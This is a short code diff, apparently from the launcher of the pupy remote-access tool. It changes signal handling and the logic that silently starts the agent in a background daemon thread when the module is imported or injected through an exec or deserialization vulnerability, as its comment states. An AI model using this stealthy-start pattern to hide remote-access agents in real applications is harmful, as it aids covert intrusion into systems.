@@ -297,8 +297,11 @@ def main():
     global debug
     global attempt
 
-    if hasattr(signal, 'SIGHUP'):
-        signal.signal(signal.SIGHUP, handle_sighup)
+    try:
+        if hasattr(signal, 'SIGHUP'):
+            signal.signal(signal.SIGHUP, handle_sighup)
+    except:
+        pass
 
     if len(sys.argv) > 1:
         parser = argparse.ArgumentParser(
@@ -460,16 +463,12 @@ def rpyc_loop(launcher):
 if __name__ == "__main__":
     main()
 else:
-    is_android = False
-
-    try:
-        from kivy.utils import platform as kivy_plat
-        if kivy_plat=="android":
-            is_android=True
-    except:
-        pass
-
-    if not is_android:
-        t=threading.Thread(target=main) # to allow pupy to run in background when imported or injected through a python application exec/deserialization vulnerability
-        t.daemon=True
-        t.start()
+    import platform
+    if not platform.system() == 'android':
+        if not hasattr(platform, 'pupy_thread'):
+            # to allow pupy to run in background when imported or injected
+            # through a python application exec/deserialization vulnerability
+            t = threading.Thread(target=main)
+            t.daemon = True
+            t.start()
+            setattr(platform, 'pupy_thread', t)
